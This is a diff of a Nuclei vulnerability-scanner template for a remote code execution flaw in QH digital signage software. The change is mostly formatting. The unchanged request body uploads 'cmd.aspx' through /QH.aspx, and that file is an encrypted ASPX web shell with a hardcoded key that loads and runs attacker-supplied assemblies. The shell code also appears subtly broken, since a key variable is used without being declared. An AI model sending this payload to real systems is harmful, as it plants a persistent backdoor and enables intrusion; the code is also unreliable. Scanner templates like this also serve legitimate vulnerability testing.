@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: Digital-Signage-rce
 
 info:
@@ -7,7 +8,7 @@ info:
   reference: https://www.zeroscience.mk/codes/qhsignage_rce.txt
   tags: Digital,rce
 
-requests:
+http:
   - raw:
       - |
         POST /QH.aspx HTTP/1.1
@@ -17,22 +18,22 @@ requests:
         ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
         Content-Disposition: form-data; name="fileToUpload"; filename="cmd.aspx"
         Content-Type: application/octet-stream
-        
+
         <%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b");  Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>
         ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
         Content-Disposition: form-data; name="action"
-        
+
         upload
         ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
         Content-Disposition: form-data; name="responderId"
-        
+
         ResourceNewResponder
         ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
         Content-Disposition: form-data; name="remotePath"
-        
+
         /opt/resources
         ------WebKitFormBoundaryhbcZX7o0Hw19h3kr--
-        
+
     matchers-condition: and
     matchers:
       - type: status
